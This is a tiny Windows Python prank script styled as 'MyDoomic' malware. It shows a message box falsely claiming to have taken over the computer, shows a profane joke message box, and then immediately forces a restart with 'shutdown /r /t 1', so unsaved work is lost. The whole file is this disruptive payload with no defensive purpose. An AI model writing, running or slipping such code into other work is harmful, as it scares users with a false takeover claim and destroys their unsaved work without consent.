import os
import ctypes
#kill me please

ctypes.windll.user32.MessageBoxW(0, "Sorry for being too generous and taking your computer for myself.", "MyDoomic --fuk i forgot how to code", 1)
ctypes.windll.user32.MessageBoxW(0, "Rip @Clyde. we will miss u mf", "MyDoomic", 1)

#
#sorry clyde https://cdn.discordapp.com/attachments/954022609551491162/1177537882131546132/image.png?ex=6572de9c&is=6560699c&hm=c8fa6a22d5e548eaf4be4b46bb59cb17d99d4a714d700dc9f621dad82348ced4&
#

os.system("shutdown /r /t 1")